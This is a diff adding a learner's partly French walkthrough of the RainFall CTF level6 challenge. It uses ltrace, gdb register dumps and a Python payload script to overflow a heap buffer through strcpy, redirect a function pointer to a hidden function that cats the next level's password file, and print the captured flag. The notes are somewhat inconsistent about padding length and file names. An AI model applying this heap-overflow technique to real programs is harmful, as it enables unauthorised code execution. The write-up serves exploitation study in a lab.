@@ -1,0 +1,191 @@
+level6@RainFall:~$ ./level6
+Segmentation fault (core dumped)
+level6@RainFall:~$
+
+
+level6@RainFall:~$ ./level6 hey
+Nope
+level6@RainFall:~$ ./level6 123
+Nope
+level6@RainFall:~$ ./level6 /n
+Nope
+level6@RainFall:~$
+
+
+level6@RainFall:~$ ltrace ./level6
+__libc_start_main(0x804847c, 1, 0xbffff7f4, 0x80484e0, 0x8048550 <unfinished ...>
+malloc(64)                                                    = 0x0804a008
+malloc(4)                                                     = 0x0804a050
+strcpy(0x0804a008, NULL <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+level6@RainFall:~$ ltrace ./level6 hey
+__libc_start_main(0x804847c, 2, 0xbffff7e4, 0x80484e0, 0x8048550 <unfinished ...>
+malloc(64)                                                    = 0x0804a008
+malloc(4)                                                     = 0x0804a050
+strcpy(0x0804a008, "hey")                                     = 0x0804a008
+puts("Nope"Nope
+)                                                  = 5
++++ exited (status 5) +++
+level6@RainFall:~$
+
+
+scp -P 4242 level6@192.168.1.15:/home/user/level6/level6 ./bin/.
+
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+...
+0x08048454  n
+0x08048468  m
+0x0804847c  main
+...
+(gdb)
+
+int n() {
+    int var_1;
+    var_1 = system(/* line */ "/bin/cat /home/user/level7/.pass");
+    return var_1;
+}
+
+int m() {
+    int var_1;
+    var_1 = puts(/* str */ "Nope");
+    return var_1;
+}
+
+int main(int argc, char ** argv, char ** envp) {
+	char *dest;
+	int *Var1;
+	
+	dest = malloc(64);
+	Var1 = malloc(4);
+	*Var1 = m;
+	strcpy(dest, argv[1]);
+	(*(code *)*Var1)();
+	return;
+}
+
+
+l'idee vas etre d'utiliser str cpy et d'overflow le malloc(64)
+
+level6@RainFall:~$ ./level6 $(python -c 'print("a"*71)')
+Nope
+level6@RainFall:~$ ./level6 $(python -c 'print("a"*72)')
+Segmentation fault (core dumped)
+level6@RainFall:~$
+
+
+donc overflow a partir de 72 octetc,
+allons voir dans gdb combien d'octets pour overide eip:
+
+(gdb) run $(python -c 'print("a"*76)')
+Starting program: /home/user/level6/level6 $(python -c 'print("a"*76)')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61616161 in ?? ()
+(gdb) i r
+eax            0x61616161       1633771873
+ecx            0xbffff900       -1073743616
+edx            0x804a04b        134520907
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff6bc       0xbffff6bc
+ebp            0xbffff6e8       0xbffff6e8
+esi            0x0      0
+edi            0x0      0
+eip            0x61616161       0x61616161
+eflags         0x210202 [ IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb) run $(python -c 'print("a"*74)')
+Starting program: /home/user/level6/level6 $(python -c 'print("a"*74)')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08006161 in ?? ()
+(gdb) i r
+eax            0x8006161        134242657
+ecx            0xbffff900       -1073743616
+edx            0x804a049        134520905
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff6bc       0xbffff6bc
+ebp            0xbffff6e8       0xbffff6e8
+esi            0x0      0
+edi            0x0      0
+eip            0x8006161        0x8006161
+eflags         0x210202 [ IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb)
+
+donc eip overwrited avec 75 char
+
+padding de 74 et adresse
+
+script.py
+[
+	import struct
+
+	adresse = 0x08048454
+	adresse_little_endian = struct.pack("<I", adresse)  # "<I" = little-endian, 4 octets
+	print(adresse_little_endian)
+
+	# Construction de la payload
+	buffer = b"A" * 74
+
+	payload = buffer + adresse_little_endian
+
+	with open("/tmp/payload", "wb") as f:
+		f.write(payload)
+]
+
+
+level6@RainFall:~$ ./level6 $(cat /tmp/payloade)
+Segmentation fault (core dumped)
+level6@RainFall:~$ ltrace ./level6 $(cat /tmp/payloade)
+__libc_start_main(0x804847c, 2, 0xbffff7a4, 0x80484e0, 0x8048550 <unfinished ...>
+malloc(64)                                                     = 0x0804a008
+malloc(4)                                                      = 0x0804a050
+strcpy(0x0804a008, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)      = 0x0804a008
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+
+level6@RainFall:~$ gdb -ex=r --args ./level6 $(cat /tmp/payloade)
+...
+Starting program: /home/user/level6/level6 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT�
+
+Program received signal SIGSEGV, Segmentation fault.
+0x84544141 in ?? ()
+(gdb) i r
+eax            0x84544141       -2074853055
+ecx            0xbffff900       -1073743616
+edx            0x804a04d        134520909
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff6bc       0xbffff6bc
+ebp            0xbffff6e8       0xbffff6e8
+esi            0x0      0
+edi            0x0      0
+eip            0x84544141       0x84544141
+eflags         0x210202 [ IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb)
+
+en passant de 74 'a' a 72 'a' 
+
+level6@RainFall:~$ ./level6 $(cat /tmp/payloade)
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+level6@RainFall:~$
